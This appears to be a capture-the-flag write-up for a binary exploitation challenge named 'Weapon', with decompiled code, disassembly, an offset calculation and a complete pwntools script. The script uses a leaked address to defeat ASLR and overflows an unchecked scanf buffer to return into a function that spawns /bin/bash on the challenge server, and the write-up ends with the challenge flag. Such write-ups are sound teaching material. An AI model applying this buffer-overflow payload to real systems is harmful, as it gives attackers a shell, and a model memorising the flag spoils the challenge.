# **Weapon**

Pseudo code from IDA:

```c++
int arsenal()
{
  return run_cmd("/bin/bash");
}
int townsquare()
{
  char v1[20]; // [esp+0h] [ebp-18h] BYREF

  puts("You wanna open the arsenal. Tell me the passphrase!");
  printf("Your current location is townsquare with the address %p \n", townsquare);
  return __isoc99_scanf((int)"%s", (int)v1);
}
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setup();
  townsquare();
  return 0;
}
```

With the ASLR on from server, giving `townsquare`'s address can help us to compute the location of `arsenal` where the `/bin/bash` is because I can't just call the function by looking in the address in IDA.

This is the objdump of `weapon`:

```objdump
000012d6 <arsenal>:
    12d6:       f3 0f 1e fb             endbr32
    12da:       55                      push   %ebp
    12db:       89 e5                   mov    %esp,%ebp
    12dd:       83 ec 08                sub    $0x8,%esp
    12e0:       e8 9c 00 00 00          call   1381 <__x86.get_pc_thunk.ax>
    12e5:       05 d7 2c 00 00          add    $0x2cd7,%eax
    12ea:       83 ec 0c                sub    $0xc,%esp
    12ed:       8d 80 4c e0 ff ff       lea    -0x1fb4(%eax),%eax
    12f3:       50                      push   %eax
    12f4:       e8 b2 ff ff ff          call   12ab <run_cmd>
    12f9:       83 c4 10                add    $0x10,%esp
    12fc:       90                      nop
    12fd:       c9                      leave
    12fe:       c3                      ret

000012ff <townsquare>:
    12ff:       f3 0f 1e fb             endbr32
    1303:       55                      push   %ebp
    1304:       89 e5                   mov    %esp,%ebp
    1306:       53                      push   %ebx
    1307:       83 ec 14                sub    $0x14,%esp
```

Let's do some math: 0x12ff - 0x12d6 = 41. Ahhh I can call `arsenal` by its distance to `townsquare` now thanks to the give from `townsquare`.
Overwritting `var_18` (0x18) and `var_4` (0x4) then I can get to arsenal.

```ida
public townsquare
townsquare proc near

var_18= byte ptr -18h
var_4= dword ptr -4
```

The exploit code:

```python
from pwn import *
import time

r = remote("61.28.237.24",30201)
r.recvuntil('the address ')
address=int(r.recv(),16) #get the address
print(address)
sleep(0.5)
payload= "A"*28+p32(address-41)

r.send(payload)
r.interactive()

#HCMUS-CTF{you_know_how_to_compute_location}
```

[**Turn Back**](README.md)